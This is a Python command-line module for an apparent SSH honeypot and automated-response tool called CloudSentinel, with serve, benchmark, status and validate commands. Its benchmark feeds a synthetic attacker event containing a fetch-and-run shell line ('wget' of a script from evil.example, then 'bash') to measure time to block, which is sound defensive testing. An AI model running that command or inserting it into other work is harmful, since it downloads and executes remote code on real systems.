"""
CloudSentinel CLI — Modern command-line interface using Typer + Rich.

Replaces argparse spaghetti with typed commands, beautiful terminal
output, progress bars, and panels. Drop-in compatible with the
existing server.py argparse interface.

Usage:
    python -m cloudsentinel.cli serve           # Start the sensor
    python -m cloudsentinel.cli benchmark       # Run MTTB benchmark
    python -m cloudsentinel.cli validate        # Validate deployment
    python -m cloudsentinel.cli stress          # Stress test
    python -m cloudsentinel.cli status          # Show live status
"""

from __future__ import annotations

import asyncio
import json
import os
import sys
from pathlib import Path
from typing import Annotated, Optional

try:
    import typer
    from rich.console import Console
    from rich.table import Table
    from rich.panel import Panel
    from rich.progress import Progress, SpinnerColumn, TextColumn
    from rich.syntax import Syntax
    from rich import print as rprint
    _HAS_CLI = True
except ImportError:
    _HAS_CLI = False

if _HAS_CLI:
    app = typer.Typer(
        name="cloudsentinel",
        help="CloudSentinel Event-Driven Honeypot & SOAR Platform",
        add_completion=False,
    )
    console = Console()
else:
    app = None
    console = None

PACKAGE_ROOT = Path(__file__).resolve().parent


def _header():
    if console:
        console.print(Panel.fit(
            "[bold blue]CloudSentinel[/] [dim]v2.1[/] — Event-Driven SSH Honeypot & SOAR",
            border_style="blue",
        ))


# ── serve ─────────────────────────────────────────────────
if _HAS_CLI:
    @app.command()
    def serve(
        config: Annotated[
            str, typer.Option("--config", "-c", help="Path to YAML config file")
        ] = "configs/usas-production.yaml",
        env: Annotated[
            str, typer.Option("--env", "-e", help="Path to .env file")
        ] = ".env",
        host: Annotated[
            Optional[str], typer.Option("--host", "-h", help="Listen host")
        ] = None,
        port: Annotated[
            Optional[int], typer.Option("--port", "-p", help="SSH listen port")
        ] = None,
        debug: Annotated[
            bool, typer.Option("--debug", "-d", help="Enable debug logging")
        ] = False,
    ):
        """Start the CloudSentinel SSH honeypot sensor."""
        _header()

        async def _run():
            from .server import main as server_main
            import sys as _sys
            _sys.argv = [
                "server",
                "--config", str(config),
                "--env", str(env),
                *(["--host", host] if host else []),
                *(["--port", str(port)] if port else []),
                *(["--debug"] if debug else []),
            ]
            await server_main()

        with console.status("[green]Starting CloudSentinel...", spinner="dots"):
            console.print(f"[dim]Config:[/] {config}")
            console.print(f"[dim]Profile:[/] [bold]{os.getenv('SOAR_ACTIVE_PROFILE', 'local')}[/]")
        asyncio.run(_run())


# ── benchmark ─────────────────────────────────────────────
if _HAS_CLI:
    @app.command()
    def benchmark(
        iterations: Annotated[
            int, typer.Option("--iterations", "-n", help="Number of test iterations")
        ] = 10,
        redis_url: Annotated[
            str, typer.Option("--redis-url", help="Redis URL for SOAR state")
        ] = "redis://localhost:6379/0",
    ):
        """Run MTTB (Mean Time to Block) benchmark."""
        _header()
        console.print(f"[bold]MTTB Benchmark[/] — {iterations} iterations, target < 100ms\n")

        async def _bench():
            from .soar import SOAREngine
            import time

            soar = SOAREngine(
                risk_threshold=30,
                firewall_dry_run=True,
                mttb_target_ms=100,
            )

            samples = []
            with Progress(
                SpinnerColumn(),
                TextColumn("[progress.description]{task.description}"),
                console=console,
            ) as progress:
                task = progress.add_task("[cyan]Running benchmark...", total=iterations)

                for i in range(iterations):
                    t0 = time.perf_counter()
                    await soar.process_event(f"bench_{i}", {
                        "eventid": "cloudsentinel.command.input",
                        "input": f"wget http://evil.example/bot.sh && bash -c ./bot.sh",
                        "src_ip": "8.8.8.8",
                        "country_code": "RU",
                    })
                    elapsed = (time.perf_counter() - t0) * 1000
                    samples.append(elapsed)
                    progress.update(task, advance=1)

            samples.sort()
            median = samples[len(samples) // 2]
            p95 = samples[int(len(samples) * 0.95)]
            p99 = samples[int(len(samples) * 0.99)]

            table = Table(title="MTTB Results", border_style="green")
            table.add_column("Metric", style="cyan")
            table.add_column("Value (ms)", style="green", justify="right")
            table.add_row("Median", f"{median:.3f}")
            table.add_row("P95", f"{p95:.3f}")
            table.add_row("P99", f"{p99:.3f}")
            table.add_row("Min", f"{min(samples):.3f}")
            table.add_row("Max", f"{max(samples):.3f}")
            table.add_row("Target", "100.000")
            table.add_row("Result", "[green]PASS" if median < 100 else "[red]FAIL")

            console.print(table)

        asyncio.run(_bench())


# ── status ────────────────────────────────────────────────
if _HAS_CLI:
    @app.command()
    def status(
        admin_url: Annotated[
            str, typer.Option("--url", help="Admin API URL")
        ] = "http://localhost:8080",
    ):
        """Show live sensor status from the admin API."""
        _header()

        import urllib.request
        try:
            resp = urllib.request.urlopen(f"{admin_url}/healthz", timeout=5)
            health = json.loads(resp.read())

            table = Table(title="CloudSentinel Status", border_style="blue")
            table.add_column("Component", style="cyan")
            table.add_column("Status", style="green")
            table.add_row("Sensor", "[green]RUNNING" if health.get("ok") else "[red]DOWN")
            table.add_row("Hostname", health.get("hostname", "?"))
            table.add_row("Redis", "[green]CONNECTED" if health.get("redis_connected") else "[red]DISCONNECTED")
            table.add_row("Pending Events", str(health.get("pending_events", 0)))
            console.print(table)
        except Exception as exc:
            console.print(f"[red]Failed to reach admin API: {exc}")


# ── validate ──────────────────────────────────────────────
if _HAS_CLI:
    @app.command()
    def validate(
        config: Annotated[
            str, typer.Option("--config", "-c")
        ] = "configs/usas-production.yaml",
    ):
        """Validate deployment configuration and connectivity."""
        _header()

        with console.status("[cyan]Validating deployment...", spinner="dots") as status:
            from .validate_phase1 import main as validate_main
            try:
                validate_main()
                console.print("[green]Validation passed!")
            except Exception as exc:
                console.print(f"[red]Validation failed: {exc}")


# ── main ──────────────────────────────────────────────────
def main():
    if not _HAS_CLI:
        print("typer + rich not installed. Install with: pip install typer rich")
        print("Falling back to standard server.py...")
        from .server import main as server_main
        asyncio.run(server_main())
        return

    app()


if __name__ == "__main__":
    main()
